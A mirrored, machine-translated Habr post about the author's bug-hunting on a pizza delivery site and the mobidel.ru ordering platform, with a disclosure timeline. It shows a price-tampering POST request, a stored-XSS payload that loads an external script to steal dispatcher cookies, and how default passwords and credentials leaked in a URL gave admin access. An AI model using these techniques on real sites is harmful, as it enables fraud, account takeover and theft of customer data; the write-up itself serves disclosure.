<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>[Free pizza] Hacking a pizza delivery site, hacking mobidel.ru</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="I often order pizza in Odessa, most of all I like delivery of pizza.od.ua, they do not regret filling and you can create a pizza from your ingredients...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>[Free pizza] Hacking a pizza delivery site, hacking mobidel.ru</h1><div class="post__text post__text-html js-mediator-article">  I often order pizza in Odessa, most of all I like delivery of pizza.od.ua, they do not regret filling and you can create a pizza from your ingredients, in other delivery services you can choose only the pizza that you are offered, add more ingredients or choose other can not.  About two months ago I got hooked on sushi with them.  Recently, sushi is temporarily not delivered, then I found another delivery of sushi and pizza. <br><br>  I decided to check it for vulnerabilities. <br><br>  <b>The first vulnerability</b> - the most popular on such sites - is the lack of verification of the amount of payment for the goods ( <b>iDOR</b> ). <br><a name="habracut"></a><br>  There is a <b>price</b> variable in the POST request, there is <b>finalPrice</b> , the <b>finalPrice</b> variable is editable and you can make yourself a discount on pizza.  Request: 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre><code class="python hljs">POST /oplata.html HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> Host: www.pizza.com User-Agent: Mozilla/<span class="hljs-number"><span class="hljs-number">5.0</span></span> (Windows NT <span class="hljs-number"><span class="hljs-number">6.2</span></span>; WOW64; rv:<span class="hljs-number"><span class="hljs-number">51.0</span></span>) Gecko/<span class="hljs-number"><span class="hljs-number">20100101</span></span> Firefox/<span class="hljs-number"><span class="hljs-number">51.0</span></span> Accept: application/json, text/javascript, */*; q=<span class="hljs-number"><span class="hljs-number">0.01</span></span> Accept-Language: ru-RU,ru;q=<span class="hljs-number"><span class="hljs-number">0.8</span></span>,en-US;q=<span class="hljs-number"><span class="hljs-number">0.5</span></span>,en;q=<span class="hljs-number"><span class="hljs-number">0.3</span></span> Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF<span class="hljs-number"><span class="hljs-number">-8</span></span> X-Requested-With: XMLHttpRequest Referer: http://yahoo.com/{{<span class="hljs-number"><span class="hljs-number">2</span></span>+<span class="hljs-number"><span class="hljs-number">2</span></span>}} Content-Length: <span class="hljs-number"><span class="hljs-number">262</span></span> Cookie: streetId=&amp;streetName=qwqwqw&amp;persons=<span class="hljs-number"><span class="hljs-number">1</span></span>&amp;change=<span class="hljs-number"><span class="hljs-number">500</span></span>&amp;name=qw&amp;phone=%<span class="hljs-number"><span class="hljs-number">2</span></span>B38(<span class="hljs-number"><span class="hljs-number">111</span></span>)<span class="hljs-number"><span class="hljs-number">1111111</span></span>&amp;email=mm%<span class="hljs-number"><span class="hljs-number">40</span></span>mm.mm&amp;t-ord=&amp;comment=&amp;promocode=&amp;agreement=on&amp;check-ord=online&amp;order%<span class="hljs-number"><span class="hljs-number">5</span></span>B0%<span class="hljs-number"><span class="hljs-number">5</span></span>D%<span class="hljs-number"><span class="hljs-number">5</span></span>Bid%<span class="hljs-number"><span class="hljs-number">5</span></span>D=<span class="hljs-number"><span class="hljs-number">1162</span></span>&amp;order%<span class="hljs-number"><span class="hljs-number">5</span></span>B0%<span class="hljs-number"><span class="hljs-number">5</span></span>D%<span class="hljs-number"><span class="hljs-number">5</span></span>Bamount%<span class="hljs-number"><span class="hljs-number">5</span></span>D=<span class="hljs-number"><span class="hljs-number">2</span></span>&amp;order%<span class="hljs-number"><span class="hljs-number">5</span></span>B0%<span class="hljs-number"><span class="hljs-number">5</span></span>D%<span class="hljs-number"><span class="hljs-number">5</span></span>Btype%<span class="hljs-number"><span class="hljs-number">5</span></span>D=rollyi&amp;price=<span class="hljs-number"><span class="hljs-number">210</span></span>&amp;finalPrice=<span class="hljs-number"><span class="hljs-number">30</span></span></code> </pre> <br>  We change the finalPrice and we paid for the pizza <u>30</u> hryvnia instead of <u>210</u> .  The order was accepted, but the administrators noticed the substitution and refused to send me a pizza. <br><br>  <b>The second vulnerability</b> .  When the order is sent, it is redirected to <a href="http://pizza.com/your_order.html%3Forder%3D567808%26ret%3D1">pizza.com/your_order.html?order=567808&amp;ret=1</a> , the order number is displayed on the page.  Instead of the number, enter js <a href="http://pizza.com/your_order.html%3Forder%3D">pizza.com/your_order.html?order=</a> "&gt; &amp; ret = 1 and get the <b>Reflected XSS</b> vulnerability. <br><br>  <b>The third vulnerability</b> is <s>Logout csrf and clickjacking</s> <b>Disclosure information and the capture of the administrative</b> order <b>panel</b> . <br><br>  It turned out that when we ordered food, it was not yet added to the admin panel for review.  To add an order, the site creates on the page <a href="http://pizza.com/your_order.html%3Forder%3D567808%26ret%3D1">pizza.com/your_order.html?order=567808&amp;ret=1</a> iframe with the address: <br><br><pre> <code class="css hljs"><span class="hljs-selector-tag"><span class="hljs-selector-tag">http</span></span>://<span class="hljs-selector-tag"><span class="hljs-selector-tag">pizza</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.com</span></span>/<span class="hljs-selector-tag"><span class="hljs-selector-tag">your_order</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.html</span></span>?<span class="hljs-selector-tag"><span class="hljs-selector-tag">order</span></span>=567808&amp;<span class="hljs-selector-tag"><span class="hljs-selector-tag">curl1</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">aHR0cDovL29ubGluZS5tb2JpZGVsLnJ1L21ha2VPcmRlci5waHA</span></span>/==</code> </pre> <br><br>  curl1 is the address of the site that is loaded in the frame, looks like base64, decodes it, turns out to decode, it turns out <a href="http://online.mobidel.ru/makeOrder.php%3Fuser%3Droot%26password%3Dpassword%26wid%3D5040%26family%3D%25D0%25B4%25D0%25B0%25D0%25BD%25D0%25BD%25D0%25BD%25D1%258B%25D0%25B5_%25D0%25BD%25D0%25B0%25D1%2588%25D0%25B5%25D0%25B3%25D0%25BE_%25D0%25B7%25D0%25B0%25D0%25BA%25D0%25B0%25D0%25B7%25D0%25B0">online.mobidel.ru/makeOrder.php?user=root&amp;password=password&amp;wid=5040&amp;family=danny_nasho_kazaka</a> , wid site <a href="http://online.mobidel.ru/makeOrder.php%3Fuser%3Droot%26password%3Dpassword%26wid%3D5040%26family%3D%25D0%25B4%25D0%25B0%25D0%25BD%25D0%25BD%25D0%25BD%25D1%258B%25D0%25B5_%25D0%25BD%25D0%25B0%25D1%2588%25D0%25B5%25D0%25B3%25D0%25BE_%25D0%25B7%25D0%25B0%25D0%25BA%25D0%25B0%25D0%25B7%25D0%25B0">id</a> , trying log in to the admin <a href="http://online.mobidel.ru/">online.mobidel.ru</a> and we got it.  We look at our order, it can be edited, sent for processing on behalf of the dispatcher and <b>get free pizza</b> (of course I will not do this). <br><br><img src="https://habrastorage.org/files/bd2/da1/d2d/bd2da1d2d930475eb91730dfcee0ed1b.png"><br><br>  We can also view all customer data and current orders. <br><br><img src="https://habrastorage.org/files/68a/e5c/cbd/68ae5ccbde524e8aa2ba03dce7d9d50d.png"><br><img src="https://habrastorage.org/files/1fb/478/722/1fb47872258247efa137ea96ecda259c.png"><br><br>  We inform the pizza delivery service about this vulnerability, we get 10 any free pizzas or sushi. <br><br>  Chronology: <br><br>  <b>January 29th</b>  Reported a vulnerability. <br><br>  January 30.  Awarded a reward of 20 free pizzas or sushi with a 50% discount (10 free pizzas). <br><br>  February 19th  Vulnerability fixed. <br><br>  We now turn to <a href="http://mobidel.ru/">mobidel.ru</a> .  The order was created in a get request with a login and password in clear text <a href="http://pizza.com/your_order.html%3Forder%3D567808%26curl1%3D%25D1%2585%25D1%258D%25D1%2588">pizza.com/your_order.html?order=567808&amp;curl1= hash</a> .  There is a possibility that other clients have the same vulnerability.  We look at the page with clients, from there we collect urls of their clients.  Checked, it turned out that it was the only case where the username and password are in the clear. <br>  Go ahead. <br><br>  1) Detect <b>Stored XSS</b> <br><br>  If you send through an order script: <br><br><pre> <code class="javascript hljs"><span class="hljs-string"><span class="hljs-string">"&gt; &lt;/script&gt;"</span></span>&gt;<span class="xml"><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">script</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">https://securityz.net/any_script.js?</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span><span class="undefined"></span><span class="hljs-tag"><span class="xml"><span class="undefined"></span><span class="hljs-tag">&lt;/</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">script</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span></span> ,</code> </pre> <br>  Then we will receive the dispatcher's <b>cookies</b> and <b>hack the admin of</b> orders from any site where this script will be executed.  Vulnerable fields: Home, time, promotional code, comment. <br><br>  2) Find the vulnerability of <b>Bruteforce &amp; Account Takeover</b> <br><br>  We are registering, we receive a message about the activation of the test period of 30 days with our login details: <br><br><ul><li>  Company ID: 5687 </li><li>  Username: disp5687 </li><li>  Password: 123456 </li></ul><br><img src="https://habrastorage.org/files/bbd/e87/d57/bbde87d57f354078b7a9c905eed258cc.png"><br><br>  I logged into my account and could not immediately find where to change my password.  Probably the other users too.  So it is - almost every ID has a password of 123456. About 2.5 thousand users have a default password (those who activated 30 days for free and some accounts of those who are on a permanent basis).  <b>A lot of email addresses, phone numbers and name are revealed.</b> <br><br><img src="https://habrastorage.org/files/fa9/8d7/377/fa98d7377774498bb87a1536e4ce5d13.png"><br><br>  If for the dispatcher‚Äôs office there was a conditional password 123456, then about the courier‚Äôs office they did not bother: <br><br><ul><li>  Company ID: 5687 </li><li>  Username: 5687 </li><li>  Password: 5687 </li></ul><br>  This company has a maximum price of 2500 per month for their services, a minimum of 500, they have only 5600 clients, I am sure that at least 2000 of them ordered services, 2000 multiplied by 1000, it turns <b>out 2,000,000 rubles a month</b> .  They earn not bad (perhaps I am mistaken, and the <a href="https://ru.wikipedia.org/wiki/%25D0%259A%25D0%25BE%25D0%25BD%25D0%25B2%25D0%25B5%25D1%2580%25D1%2581%25D0%25B8%25D1%258F_(%25D0%25B2_%25D0%25B8%25D0%25BD%25D1%2582%25D0%25B5%25D1%2580%25D0%25BD%25D0%25B5%25D1%2582-%25D0%25BC%25D0%25B0%25D1%2580%25D0%25BA%25D0%25B5%25D1%2582%25D0%25B8%25D0%25BD%25D0%25B3%25D0%25B5)">conversion</a> from 5600 may be less, but still not bad), but they do not care about safety. <br><br>  <b>January 29</b> - we send 2 messages on finding the vulnerability, <b>February 28</b> - another letter, <b>March 1</b> - three more letters, the company still ignores my messages.  March 1, I contacted the head of the pizza delivery service, he dropped the link to the programmer's vk that works in mobidel.  I wrote to him about the vulnerability, he said, write to the same email address, this time you will not be ignored. <br><br>  Company response: <br><blockquote>  Hello! <br><br>  We would not call it a vulnerability, and your actions are quite logical, the password <br>  123456 standard for all those who use the system on an ongoing basis <br>  change it. </blockquote><br>  My answer: <br><blockquote>  Those who use the system on an ongoing basis change it.  And those who do not use, you do not care about the fact that their personal data is stolen? </blockquote><br>  The message is again ignored, another answer: <br><blockquote>  No need to ignore this vulnerability, ignoring is not a solution. </blockquote><br>  + <b>Send a report about xss vulnerabilities</b> with the seizure of any delivery service. <br><br>  We give the company <b>20 days</b> to eliminate its vulnerabilities or at least respond to my messages.  This <b>does not happen</b> , I post it in general. <br><br>  As a bonus, here is such a feature for pentesters: when you need to test a vulnerability on a website on two accounts, and your mail is in Yandex, then you can register two accounts for one mail (mail@yandex.ru; mail@ya.ru). <br><br>  Conclusion from this article: You never need to set default passwords on accounts, you need to generate only complex passwords, with upper, lower case, numbers and symbols. <br><br>  Memes for this topic: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/714/bf2/7a4/714bf27a4279a4c13cc4dfcdb7ce2cca.jpg" alt="image"><br><br>  Addition to the article: <br><br>  One hacker from Habr wrote to me in the mail that he also discovered a vulnerability on mobidel.  I didn‚Äôt brute the directories, and indeed after I‚Äôve been ignored for a long time, the site almost did not touch.  And he scrolled and found an open php file with server configs (it was very stupid not to close it), there is data for: access to the database, data for access to the personal account of the robokassa payment system (you can watch user transactions and manage the mobidel account), data to access the mobidel admin area on their website.  I did not try to enter anywhere, just wrote a letter ‚Äúimmediately close this file in .htaccess and change the passwords‚Äù, corrected very quickly, now the file is not available.  And they said thank you. <br><br>  I hope this article will be a lesson for them and they will close all their vulnerabilities. <br><br>  Previous article <a href="http://securityz.net/hack_omnidesk/">[BAGHANTING] BLIND XSS VULNERABILITY ON THE SITES OF OMN Support Service</a> <br><br>  IB audit <s>for food</s> can be ordered <a href="https://securityz.net/w9w/">here</a> . </div><p>Source: <a href="https://habr.com/ru/post/321116/">https://habr.com/ru/post/321116/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../321106/index.html">Data Oriented Design in practice</a></li>
<li><a href="../321108/index.html">We start the gas flow rate sensor</a></li>
<li><a href="../321110/index.html">Recursive multiple add IP to lock in the .htaccess file</a></li>
<li><a href="../321112/index.html">Osiris - the new reincarnation of the Locky Trojan</a></li>
<li><a href="../321114/index.html">The deadline of the Stepik Contest contest is extended until March 31, it's time to create IT tasks</a></li>
<li><a href="../321118/index.html">"There is nowhere less": scientists from IBM have stored information in the atom</a></li>
<li><a href="../321120/index.html">"100,000 times faster": ultra-short light pulses in computing</a></li>
<li><a href="../321122/index.html">Digest: DPI technologies and SORM equipment</a></li>
<li><a href="../321124/index.html">VMware Introduces New NSX Tools for SDN</a></li>
<li><a href="../321126/index.html">‚ÄúCosmos is the last frontier‚Äù: A bit about the IT infrastructure of the fastest radio telescope ASKAP</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>